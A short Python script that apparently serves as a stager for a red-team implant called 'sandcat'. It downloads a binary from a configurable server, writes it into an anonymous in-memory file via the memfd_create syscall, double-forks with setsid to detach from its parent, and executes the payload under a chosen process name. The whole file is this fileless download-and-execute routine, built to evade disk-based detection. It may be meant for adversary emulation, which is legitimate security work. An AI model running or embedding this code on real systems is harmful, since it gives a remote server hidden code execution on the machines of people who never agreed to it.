from __future__ import print_function  # import for Python2/3 compatibility
import os
import io
import ctypes
import requests

# pull environment variables for server, group, and process name
proc_name = os.getenv('SC_PROC_NAME', 'sandcat')
server = os.getenv('SC_DEFAULTSERVER', 'http://localhost:8888')
group = os.getenv('SC_DEFAULTGROUP', 'red')

print("{} {} {}".format(proc_name, server, group))

headers = dict(file='sandcat.go', platform='linux', server=server, group=group)
r = requests.get('%s/file/download' % server, headers=headers, stream=True)
print(r.status_code)
if r.status_code == 200:
    print("OK")
    obj = io.BytesIO(r.content)
    fd = ctypes.CDLL(None).syscall(319, "", 1)
    final_fd = open('/proc/self/fd/%s' % str(fd), 'wb')  # write exec
    final_fd.write(obj.read())
    final_fd.close()

    fork1 = os.fork()
    if 0 != fork1:
        os._exit(0)

    ctypes.CDLL(None).syscall(112)

    fork2 = os.fork()
    if 0 != fork2:
        os._exit(0)

    os.execl('/proc/self/fd/%s' % str(fd), proc_name)  # replace existing proc with new process and execute new binary
